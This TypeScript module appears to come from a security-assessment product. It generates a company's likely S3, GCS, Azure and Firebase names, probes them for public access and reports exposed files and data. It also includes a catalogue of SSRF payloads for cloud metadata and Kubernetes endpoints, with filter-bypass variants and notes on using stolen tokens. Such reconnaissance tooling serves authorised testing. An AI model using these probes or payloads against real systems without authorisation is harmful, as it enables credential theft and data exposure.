import { logger } from "./logger";

// ── Types ──────────────────────────────────────────────────────────────────────

export type BucketStatus   = "public_listable" | "public_exists" | "private" | "not_found" | "error";
export type FirebaseStatus = "public" | "restricted" | "not_found" | "error";

export interface CloudBucketResult {
  provider: "aws_s3" | "gcs" | "azure";
  name: string;
  url: string;
  status: BucketStatus;
  httpStatus: number;
  isPublic: boolean;
  isListable: boolean;
  fileCount?: number;
  sampleFiles?: string[];
  region?: string;
  contentType?: string;
}

export interface FirebaseResult {
  url: string;
  name: string;
  status: FirebaseStatus;
  httpStatus: number;
  isPublic: boolean;
  dataPreview?: string;
  dataKeys?: string[];
}

export interface SsrfEndpoint {
  provider: string;
  url: string;
  description: string;
  risk: "critical" | "high";
  payloadVariants: string[];
  notes: string;
}

export interface CloudReconResult {
  buckets: CloudBucketResult[];
  firebase: FirebaseResult[];
  ssrfEndpoints: SsrfEndpoint[];
  testedNames: string[];
  stats: {
    totalTested: number;
    publicBuckets: number;
    privateBuckets: number;
    existingBuckets: number;
    publicFirebase: number;
    restrictedFirebase: number;
    ssrfEndpoints: number;
    awsFound: number;
    gcsFound: number;
    azureFound: number;
  };
}

// ── Name generation ────────────────────────────────────────────────────────────

function extractCompanyName(target: string): string {
  try {
    const host = target.startsWith("http") ? new URL(target).hostname : target;
    // Strip www., trailing TLDs (handle up to 2-part TLDs)
    return host
      .replace(/^www\./, "")
      .split(".")[0]
      .toLowerCase()
      .replace(/[^a-z0-9]/g, "");
  } catch {
    return target.toLowerCase().replace(/[^a-z0-9]/g, "");
  }
}

function generateBucketNames(company: string, extraHints: string[] = []): string[] {
  const suffixes = [
    "", "-dev", "-prod", "-staging", "-test", "-uat", "-qa",
    "-assets", "-static", "-media", "-images", "-uploads", "-files",
    "-data", "-backup", "-backups", "-logs", "-archive", "-config",
    "-public", "-private", "-content", "-cdn", "-web", "-app",
    "-internal", "-external", "-resources", "-docs", "-downloads",
    "-storage", "-bucket", "-blob",
  ];
  const prefixes = ["", "dev-", "prod-", "staging-", "assets-", "static-", "media-", "backup-"];

  // Normalize all seeds: primary company name + any extra hints (tags, product names, subsidiaries)
  const seeds = [
    company,
    ...extraHints
      .map(h => h.toLowerCase().replace(/[^a-z0-9-]/g, "").replace(/--+/g, "-").replace(/^-|-$/g, ""))
      .filter(h => h.length >= 3 && h.length <= 30),
  ];

  const names = new Set<string>();
  for (const seed of seeds) {
    for (const sfx of suffixes) names.add(`${seed}${sfx}`);
    for (const pfx of prefixes) if (pfx) names.add(`${pfx}${seed}`);
  }

  return [...names].filter(n => n.length >= 3 && n.length <= 63);
}

// ── HTTP helper ────────────────────────────────────────────────────────────────

const UA = "Mozilla/5.0 (compatible; CTEM-CloudRecon/1.0; +https://sentinelware.io)";

async function probeUrl(url: string, timeoutMs = 8000, retries = 2): Promise<{ status: number; body: string; contentType: string }> {
  for (let attempt = 0; attempt <= retries; attempt++) {
    try {
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), timeoutMs);
      const res = await fetch(url, {
        method: "GET",
        signal: ctrl.signal,
        headers: { "User-Agent": UA },
        redirect: "follow",
      });
      clearTimeout(t);
      // Rate limited — back off and retry
      if (res.status === 429 && attempt < retries) {
        const retryAfter = parseInt(res.headers.get("retry-after") ?? "5", 10);
        const delay = Math.min((retryAfter || 5) * 1000, 15_000) * (attempt + 1);
        await new Promise(r => setTimeout(r, delay));
        continue;
      }
      const ct = res.headers.get("content-type") ?? "";
      const body = await res.text().catch(() => "");
      return { status: res.status, body: body.slice(0, 4096), contentType: ct };
    } catch {
      if (attempt < retries) {
        await new Promise(r => setTimeout(r, 1000 * (attempt + 1)));
        continue;
      }
      return { status: 0, body: "", contentType: "" };
    }
  }
  return { status: 0, body: "", contentType: "" };
}

// ── S3 Bucket probing ─────────────────────────────────────────────────────────

function parseS3Files(xml: string): string[] {
  const files: string[] = [];
  const matches = xml.matchAll(/<Key>([^<]+)<\/Key>/g);
  for (const m of matches) {
    files.push(m[1]);
    if (files.length >= 20) break;
  }
  return files;
}

function parseS3Region(xml: string, headers?: Headers): string | undefined {
  // Try to extract region from error XML or redirect
  const regionMatch = xml.match(/<Region>([^<]+)<\/Region>/);
  if (regionMatch) return regionMatch[1];
  return undefined;
}

async function probeS3Bucket(name: string): Promise<CloudBucketResult> {
  const url = `https://${name}.s3.amazonaws.com/`;
  const { status, body, contentType } = await probeUrl(url, 8000);

  let bucketStatus: BucketStatus;
  let isPublic = false;
  let isListable = false;
  let sampleFiles: string[] | undefined;
  let fileCount: number | undefined;
  let region: string | undefined;

  if (status === 200 && body.includes("<ListBucketResult")) {
    bucketStatus = "public_listable";
    isPublic = true;
    isListable = true;
    sampleFiles = parseS3Files(body);
    const countMatch = body.match(/<KeyCount>(\d+)<\/KeyCount>/);
    if (countMatch) fileCount = parseInt(countMatch[1], 10);
    // Try region from body
    const regionM = body.match(/\.s3\.([^.]+)\.amazonaws\.com/);
    if (regionM) region = regionM[1];
  } else if (status === 403) {
    // Bucket exists but access denied (could still be interesting)
    const isAuthErr = body.includes("AccessDenied") || body.includes("AllAccessDisabled");
    bucketStatus = isAuthErr ? "private" : "public_exists";
    isPublic = !isAuthErr;
    // Try to get region from error response
    region = parseS3Region(body);
  } else if (status === 301 || status === 307) {
    // Redirected to regional endpoint — bucket exists
    bucketStatus = "private";
  } else if (status === 404 || status === 0) {
    // 404 with NoSuchBucket in body means doesn't exist
    if (body.includes("NoSuchBucket") || status === 0) {
      bucketStatus = "not_found";
    } else {
      bucketStatus = "public_exists";
      isPublic = true;
    }
  } else if (status >= 500) {
    bucketStatus = "error";
  } else {
    bucketStatus = "not_found";
  }

  return {
    provider: "aws_s3", name, url,
    status: bucketStatus, httpStatus: status,
    isPublic, isListable, sampleFiles, fileCount, region, contentType,
  };
}

// ── GCS Bucket probing ────────────────────────────────────────────────────────

function parseGCSFiles(xml: string): string[] {
  const files: string[] = [];
  const matches = xml.matchAll(/<Name>([^<]+)<\/Name>/g);
  for (const m of matches) {
    // Skip the bucket name itself (first Name entry)
    if (m[1].includes("/") || !m[1].startsWith("gs://")) {
      files.push(m[1]);
      if (files.length >= 20) break;
    }
  }
  // If no slashes, try <Key> format fallback
  if (files.length === 0) {
    const keys = xml.matchAll(/<Key>([^<]+)<\/Key>/g);
    for (const m of keys) { files.push(m[1]); if (files.length >= 20) break; }
  }
  return files;
}

async function probeGCSBucket(name: string): Promise<CloudBucketResult> {
  const url = `https://storage.googleapis.com/${name}`;
  const { status, body } = await probeUrl(url, 8000);

  let bucketStatus: BucketStatus;
  let isPublic = false;
  let isListable = false;
  let sampleFiles: string[] | undefined;

  if (status === 200 && body.includes("<ListBucketResult")) {
    // Confirmed public listable GCS bucket
    bucketStatus = "public_listable";
    isPublic = true;
    isListable = true;
    sampleFiles = parseGCSFiles(body);
  } else if (status === 200 && (body.includes('"kind": "storage#') || body.includes("storage.googleapis.com"))) {
    // GCS JSON API response — bucket exists and is readable
    bucketStatus = "public_exists";
    isPublic = true;
  } else if (status === 200) {
    // Status 200 but body doesn't have GCS-specific markers — likely CDN false positive
    bucketStatus = "not_found";
  } else if (status === 403) {
    // Bucket exists but access denied — only mark private if GCS-specific error XML present
    const isGcsError = body.includes("AccessDenied") || body.includes("BucketNotPublic") ||
      (body.includes("<?xml") && body.includes("Error"));
    bucketStatus = isGcsError ? "private" : "not_found";
  } else if (status === 404) {
    bucketStatus = "not_found";
  } else if (status === 0) {
    bucketStatus = "not_found";
  } else {
    bucketStatus = "error";
  }

  return {
    provider: "gcs", name, url,
    status: bucketStatus, httpStatus: status,
    isPublic, isListable, sampleFiles,
  };
}

// ── Azure Blob probing ────────────────────────────────────────────────────────

const AZURE_CONTAINERS = ["$web", "public", "assets", "static", "media", "uploads", "files", "content", "images", "docs", "web", "cdn"];

async function probeAzureAccount(accountName: string): Promise<CloudBucketResult[]> {
  const results: CloudBucketResult[] = [];

  // First check if the storage account exists at all
  const serviceUrl = `https://${accountName}.blob.core.windows.net/`;
  const { status: svcStatus, body: svcBody } = await probeUrl(serviceUrl, 8000);

  // If 404 immediately, account doesn't exist
  if (svcStatus === 404 || svcStatus === 0) return results;

  // Account exists (any non-404 response means the account is real)
  // Probe common containers
  await Promise.allSettled(
    AZURE_CONTAINERS.slice(0, 6).map(async (container) => {
      const url = `https://${accountName}.blob.core.windows.net/${container}?restype=container&comp=list`;
      const { status, body } = await probeUrl(url, 6000);

      let bucketStatus: BucketStatus;
      let isPublic = false;
      let isListable = false;
      let sampleFiles: string[] | undefined;

      if (status === 200 && body.includes("<EnumerationResults")) {
        bucketStatus = "public_listable";
        isPublic = true;
        isListable = true;
        const nameMatches = body.matchAll(/<Name>([^<]+)<\/Name>/g);
        sampleFiles = [];
        for (const m of nameMatches) { sampleFiles.push(m[1]); if (sampleFiles.length >= 20) break; }
      } else if (status === 200) {
        bucketStatus = "public_exists";
        isPublic = true;
      } else if (status === 403 || status === 401) {
        bucketStatus = "private";
      } else if (status === 404) {
        return; // container doesn't exist — skip
      } else {
        return;
      }

      results.push({
        provider: "azure",
        name: `${accountName}/${container}`,
        url: `https://${accountName}.blob.core.windows.net/${container}`,
        status: bucketStatus, httpStatus: status,
        isPublic, isListable, sampleFiles,
      });
    })
  );

  // Only add a generic "account exists" entry if the service URL returned a genuine Azure XML
  // error (400 with StorageErrorCode) — avoids CDN false positives on 200/403
  if (results.length === 0 && svcStatus === 400 && svcBody.includes("InvalidQueryParameterValue")) {
    results.push({
      provider: "azure",
      name: accountName,
      url: serviceUrl,
      status: "private", httpStatus: svcStatus,
      isPublic: false, isListable: false,
    });
  }

  return results;
}

// ── Firebase probing ──────────────────────────────────────────────────────────

async function probeFirebase(name: string): Promise<FirebaseResult[]> {
  const results: FirebaseResult[] = [];

  const urls = [
    `https://${name}.firebaseio.com/.json`,
    `https://${name}-default-rtdb.firebaseio.com/.json`,
    `https://${name}-default-rtdb.firebaseio.com/.json?shallow=true`,
  ];

  await Promise.allSettled(urls.slice(0, 2).map(async (url) => {
    const { status, body } = await probeUrl(url, 8000);

    let fbStatus: FirebaseStatus;
    let isPublic = false;
    let dataPreview: string | undefined;
    let dataKeys: string[] | undefined;

    if (status === 200) {
      // Firebase returns null for empty, or JSON for actual data
      if (body === "null" || body.trim() === "") {
        fbStatus = "public"; // publicly accessible but empty
        isPublic = true;
      } else {
        try {
          const parsed = JSON.parse(body);
          fbStatus = "public";
          isPublic = true;
          dataKeys = typeof parsed === "object" && parsed !== null ? Object.keys(parsed).slice(0, 10) : undefined;
          dataPreview = body.slice(0, 200);
        } catch {
          fbStatus = "public";
          isPublic = true;
          dataPreview = body.slice(0, 200);
        }
      }
    } else if (status === 401 || status === 403) {
      fbStatus = "restricted";
    } else if (status === 404 || status === 0) {
      fbStatus = "not_found";
    } else {
      fbStatus = "error";
    }

    // Only add if not already found from another URL variant
    if (!results.some(r => r.name === name && r.status === fbStatus)) {
      results.push({
        url, name,
        status: fbStatus, httpStatus: status,
        isPublic, dataPreview, dataKeys,
      });
    }
  }));

  return results;
}

// ── SSRF metadata endpoints ───────────────────────────────────────────────────

function buildSsrfEndpoints(): SsrfEndpoint[] {
  return [
    {
      provider: "AWS EC2 / ECS / Lambda",
      url: "http://169.254.169.254/latest/meta-data/",
      description: "AWS Instance Metadata Service (IMDSv1) — returns IAM role credentials, instance identity, security groups, SSH public keys, and VPC configuration without authentication",
      risk: "critical",
      payloadVariants: [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://[::ffff:169.254.169.254]/latest/meta-data/",  // IPv6 bypass
        "http://169.254.169.254.nip.io/latest/meta-data/",    // DNS rebinding bypass
        "http://0xA9FEA9FE/latest/meta-data/",                 // Hex bypass
      ],
      notes: "IMDSv1 is unauthenticated. IMDSv2 requires a PUT token first: PUT http://169.254.169.254/latest/api/token (TTL header required). Many apps forward all outbound requests making this trivially exploitable via SSRF.",
    },
    {
      provider: "GCP Compute Engine / Cloud Run",
      url: "http://metadata.google.internal/computeMetadata/v1/",
      description: "GCP Instance Metadata Server — requires Metadata-Flavor: Google header but often bypassable; exposes service account tokens, project ID, instance attributes, and SSH keys",
      risk: "critical",
      payloadVariants: [
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
      ],
      notes: "Requires Metadata-Flavor: Google header. If SSRF allows custom headers, this yields full OAuth2 access tokens for the service account. GKE clusters may expose kube-env with cluster credentials.",
    },
    {
      provider: "Azure VM / App Service",
      url: "http://169.254.169.254/metadata/instance",
      description: "Azure IMDS — exposes subscription ID, resource group, VM name, managed identity tokens; requires Metadata: true header but often exposed via SSRF header forwarding",
      risk: "critical",
      payloadVariants: [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
        "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
      ],
      notes: "Requires Metadata: true header. The identity endpoint returns Bearer tokens scoped to Azure management plane. Combine with Azure Resource Manager API for full subscription access.",
    },
    {
      provider: "DigitalOcean Droplets",
      url: "http://169.254.169.254/metadata/v1/",
      description: "DigitalOcean metadata service — exposes hostname, region, user-data scripts, and SSH keys; no authentication required",
      risk: "high",
      payloadVariants: [
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/user-data",
        "http://169.254.169.254/metadata/v1/public-keys",
        "http://169.254.169.254/metadata/v1/hostname",
        "http://169.254.169.254/metadata/v1/region",
      ],
      notes: "No authentication. User-data field often contains cloud-init scripts with hardcoded credentials or configuration secrets.",
    },
    {
      provider: "Alibaba Cloud ECS",
      url: "http://100.100.100.200/latest/meta-data/",
      description: "Alibaba Cloud ECS metadata — different IP range from AWS/Azure; exposes RAM role credentials, instance ID, and VPC details",
      risk: "high",
      payloadVariants: [
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        "http://100.100.100.200/latest/meta-data/instance-id",
        "http://100.100.100.200/latest/user-data",
      ],
      notes: "Uses 100.100.100.200 instead of 169.254.169.254. Commonly overlooked in SSRF filter blocklists.",
    },
    {
      provider: "Kubernetes API Server",
      url: "https://kubernetes.default.svc/api/v1/",
      description: "K8s API server accessible from within cluster — service account token at /var/run/secrets/kubernetes.io/serviceaccount/token can be used to enumerate/modify cluster resources",
      risk: "critical",
      payloadVariants: [
        "https://kubernetes.default.svc/api/v1/namespaces/default/secrets/",
        "https://kubernetes.default.svc/api/v1/namespaces/",
        "https://10.0.0.1/api/v1/",           // common cluster IP
        "https://10.96.0.1/api/v1/",
        "https://172.20.0.1/api/v1/",
      ],
      notes: "If running in a Kubernetes pod, the service account token is mounted at /var/run/secrets/kubernetes.io/serviceaccount/. Use it in Authorization: Bearer header to call the API.",
    },
  ];
}

// ── Main orchestrator ─────────────────────────────────────────────────────────

export async function runCloudRecon(target: string, additionalNames: string[] = []): Promise<CloudReconResult> {
  const empty: CloudReconResult = {
    buckets: [], firebase: [], ssrfEndpoints: [], testedNames: [],
    stats: { totalTested: 0, publicBuckets: 0, privateBuckets: 0, existingBuckets: 0, publicFirebase: 0, restrictedFirebase: 0, ssrfEndpoints: 0, awsFound: 0, gcsFound: 0, azureFound: 0 },
  };

  const company = extractCompanyName(target);
  if (!company || company.length < 2) return empty;

  const names = generateBucketNames(company, additionalNames);
  logger.info({ target, company, nameCount: names.length }, "Cloud recon starting");

  const ssrfEndpoints = buildSsrfEndpoints();
  const allBuckets: CloudBucketResult[] = [];
  const allFirebase: FirebaseResult[] = [];

  // ── S3: probe all names in batches of 10 ──────────────────────────────────
  const S3_BATCH = 8;
  const s3Names = names.slice(0, 40);
  for (let i = 0; i < s3Names.length; i += S3_BATCH) {
    const batch = s3Names.slice(i, i + S3_BATCH);
    const results = await Promise.allSettled(batch.map(n => probeS3Bucket(n)));
    for (const r of results) {
      if (r.status === "fulfilled" && r.value.status !== "not_found" && r.value.status !== "error") {
        allBuckets.push(r.value);
      }
    }
  }

  // ── GCS: probe all names in batches of 8 ─────────────────────────────────
  const GCS_BATCH = 8;
  const gcsNames = names.slice(0, 40);
  for (let i = 0; i < gcsNames.length; i += GCS_BATCH) {
    const batch = gcsNames.slice(i, i + GCS_BATCH);
    const results = await Promise.allSettled(batch.map(n => probeGCSBucket(n)));
    for (const r of results) {
      if (r.status === "fulfilled" && r.value.status !== "not_found" && r.value.status !== "error") {
        allBuckets.push(r.value);
      }
    }
  }

  // ── Azure: probe account names in batches of 5 ───────────────────────────
  // Azure account names must be 3–24 alphanumeric, no hyphens
  const azureNames = names.map(n => n.replace(/-/g, "").slice(0, 24)).filter(n => n.length >= 3);
  const uniqueAzure = [...new Set(azureNames)].slice(0, 20);
  for (let i = 0; i < uniqueAzure.length; i += 5) {
    const batch = uniqueAzure.slice(i, i + 5);
    const results = await Promise.allSettled(batch.map(n => probeAzureAccount(n)));
    for (const r of results) {
      if (r.status === "fulfilled") allBuckets.push(...r.value);
    }
  }

  // ── Firebase: probe top name variants ────────────────────────────────────
  const fbNames = [company, `${company}-app`, `${company}-prod`, `${company}-dev`, `${company}-db`, company.slice(0, 15)];
  const uniqueFb = [...new Set(fbNames)].filter(n => n.length >= 3).slice(0, 6);
  const fbResults = await Promise.allSettled(uniqueFb.map(n => probeFirebase(n)));
  for (const r of fbResults) {
    if (r.status === "fulfilled") allFirebase.push(...r.value.filter(f => f.status !== "not_found" && f.status !== "error"));
  }

  // ── Compute stats ─────────────────────────────────────────────────────────
  const publicBuckets  = allBuckets.filter(b => b.isPublic).length;
  const privateBuckets = allBuckets.filter(b => !b.isPublic).length;
  const stats = {
    totalTested:      names.length,
    existingBuckets:  allBuckets.length,
    publicBuckets,
    privateBuckets,
    publicFirebase:   allFirebase.filter(f => f.isPublic).length,
    restrictedFirebase: allFirebase.filter(f => f.status === "restricted").length,
    ssrfEndpoints:    ssrfEndpoints.length,
    awsFound:         allBuckets.filter(b => b.provider === "aws_s3").length,
    gcsFound:         allBuckets.filter(b => b.provider === "gcs").length,
    azureFound:       allBuckets.filter(b => b.provider === "azure").length,
  };

  logger.info({ target, company, ...stats }, "Cloud recon complete");

  // Sort: public/listable first, then public, then private
  const ORDER: BucketStatus[] = ["public_listable", "public_exists", "private"];
  allBuckets.sort((a, b) => ORDER.indexOf(a.status) - ORDER.indexOf(b.status));

  return {
    buckets: allBuckets,
    firebase: allFirebase,
    ssrfEndpoints,
    testedNames: names,
    stats,
  };
}
